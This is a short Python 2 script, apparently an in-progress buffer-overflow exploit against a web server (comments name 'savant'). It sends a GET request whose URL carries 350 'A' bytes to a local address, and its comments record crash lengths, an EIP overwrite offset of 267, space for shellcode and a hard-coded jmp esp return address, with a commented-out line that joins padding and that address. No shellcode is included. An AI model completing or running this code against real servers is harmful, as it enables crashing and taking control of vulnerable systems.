import urllib3



def getresp(stream):
	print stream.status
	print stream.data
	print stream.headers

def exploit(stream,method,url):
	r = stream.request(method,url)
	getresp(r)

#init stuff
stream = urllib3.PoolManager()
method = 'GET'

#285: a's are far from esp. in savant/root though
# crash with 264 bytes. room for shellcode in esp+d0. 300bytes of space.
# crash with 266 bytes. room for shellcode in esp+c0  300 bytes of space.
# crash with 267,268 bytes. room in shellcode in esp+70   304 bytes of space
# 267-269 works, lets go with 69 ;P

#*** 271 bytes. overwrite EIP. offset= 267
#jmpesp= '\x03\xb5\x6f\x75'

jmpesp= '\x7b\xd0\xb1\x77'
buf = '\x41'*350
#buf = '\x41'*(267) + jmpesp #'\x42'*4
try:
	print '[+] Fuzzing url with %s bytes'%len(buf)
	url = 'http://192.168.1.22/' + buf
	exploit(stream,method,url)
except Exception, e:
	print '[!] Exception: %s'%str(e)


### 0x10w1eve1 ###
